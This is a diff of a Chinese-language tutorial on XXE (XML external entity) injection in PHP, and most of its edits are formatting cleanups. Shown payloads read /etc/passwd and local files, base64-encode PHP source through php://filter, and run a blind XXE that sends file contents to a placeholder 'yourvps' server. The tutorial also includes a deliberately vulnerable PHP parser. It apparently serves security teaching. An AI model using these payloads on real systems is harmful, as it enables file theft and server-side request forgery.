@@ -80,8 +80,6 @@ wikipedia关于这的描述是:The XML DTD syntax is one of several XML schema l
 
 以php环境为例，index.php内容如下：
 
-
-
 `<?php`
 
 `$xml=simplexml_load_string($_GET['xml']);`
@@ -90,15 +88,13 @@ wikipedia关于这的描述是:The XML DTD syntax is one of several XML schema l
 
 `?>`
 
-
-
 ### 读取本地文件
 
-!\[\]\([https://thief.one/upload\_image/20170620/1.png\](https://thief.one/upload_image/20170620/1.png%29\)
+![](https://thief.one/upload_image/20170620/1.png)
+
+
 
 利用各种协议可以读取文件。比如file协议，这里的测试环境为win，所以这里我选择读取c盘里的TEST.txt。
-
-
 
 `<?xml version="1.0" encoding="utf-8"?>`
 
@@ -106,25 +102,19 @@ wikipedia关于这的描述是:The XML DTD syntax is one of several XML schema l
 
 `<root>&file;</root>`
 
-
-
 将上述xml进行url编码后传进去，可以发现读取了TEST.txt中的内容。
 
-!\[\]\([https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/2.jpg?raw=true\](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/2.jpg?raw=true%29\)
+![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/2.jpg?raw=true)
 
 我这里测试时，如果不进行url编码则不能成功解析。
 
 若使用fill协议，在unix环境下，可以用如下xml来读取passwd：
-
-
 
 `<?xml version="1.0" encoding="utf-8"?>`
 
 `<!DOCTYPE root [<!ENTITY  file SYSTEM "file:///etc/passwd">]>`
 
 `<root>&file;</root>`
-
-
 
 如果要读取php文件，因为php、html等文件中有各种括号\`&lt;\`，\`&gt;\`，若直接用file读取会导致解析错误，此时可以利用\`php://filter\`将内容转换为base64后再读取。
 
@@ -136,11 +126,9 @@ wikipedia关于这的描述是:The XML DTD syntax is one of several XML schema l
 
 `<root>&file;</root>`
 
-
-
 这里同样先经过url编码后再传入。读取结果如下:
 
-!\[\]\([https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/3.jpg?raw=true\](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/3.jpg?raw=true%29\)
+![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/3.jpg?raw=true)
 
 ### 命令执行
 
@@ -148,13 +136,11 @@ php环境下，xml命令执行要求php装有expect扩展。而该扩展默认�
 
 ### 内网探测/SSRF
 
-由于xml实体注入攻击可以利用\`[http://\`协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。](http://`协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。)
+由于xml实体注入攻击可以利用\`http://\`协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。
 
 ## bind xxe
 
 以php环境为例，现在更改index.php内容如下：
-
-
 
 `<?php`
 
@@ -162,15 +148,11 @@ php环境下，xml命令执行要求php装有expect扩展。而该扩展默认�
 
 `?>`
 
-
-
 少了print\_r，即没有回显消息。这个时候我们可以利用参数实体，通过发起http请求来攻击。
 
 ### 读取本地文件
 
 #### payload1
-
-
 
 `<?xml version="1.0" encoding="utf-8"?>`
 
@@ -178,7 +160,7 @@ php环境下，xml命令执行要求php装有expect扩展。而该扩展默认�
 
 `<!ENTITY % file SYSTEM "file:///c://TEST.txt">`
 
-`<!ENTITY % dtd SYSTEM "[`[`http://yourvps/xxe.xml"&gt](http://yourvps/xxe.xml"&gt`](http://yourvps/xxe.xml"&gt]%28http://yourvps/xxe.xml"&gt)`);`
+`<!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml">`
 
 `%dtd; %all;`
 
@@ -186,23 +168,13 @@ php环境下，xml命令执行要求php装有expect扩展。而该扩展默认�
 
 `<value>&send;</value>`
 
-
-
 在我的vps的xxe.xml的内容如下：
-
-
 
 `<!ENTITY % all "<!ENTITY send SYSTEM 'http://yourvps/%file;'>">`
 
-
-
 而测试文件TEST.txt内容为：
 
-
-
 `chybeta`
-
-
 
 整个的调用过程如下：解析时\`%dtd\`引入xxe.xml，之后\`%all\`引入\`send\`的定义，最后引用了实体send，把\`%file\`文件内容通过一个http请求发了出去。注意需要把payload经过url编码。查看vps上的access.log：
 
@@ -210,23 +182,19 @@ php环境下，xml命令执行要求php装有expect扩展。而该扩展默认�
 
 若要读取php等文件，同样需要先经过base64加密下。
 
-
-
 &lt;?xml version="1.0" encoding="utf-8"?&gt;
 
 &lt;!DOCTYPE data \[
 
 &lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;
 
-&lt;!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml"&gt;
+&lt;!ENTITY % dtd SYSTEM "[http://yourvps/xxe.xml"&gt](http://yourvps/xxe.xml"&gt);
 
 %dtd; %all;
 
 \]&gt;
 
 &lt;value&gt;&send;&lt;/value&gt;
-
-
 
 查看access.log:
 
@@ -235,8 +203,6 @@ php环境下，xml命令执行要求php装有expect扩展。而该扩展默认�
 \#\#\#\# payload2
 
 发送的xml：
-
-
 
 `<?xml version="1.0" encoding="utf-8"?>`
 
@@ -250,15 +216,9 @@ php环境下，xml命令执行要求php装有expect扩展。而该扩展默认�
 
 `]>`
 
-
-
 而在vps上的xxe.xml内容为：
 
-
-
 `<!ENTITY % payload2 "<!ENTITY &#x25; send SYSTEM 'http://yourvps/%file;'>"> %payload2;`
-
-
 
 注意的是，\`&\#25;\` 不能直接写成\`%\`，否则无法解析。
 
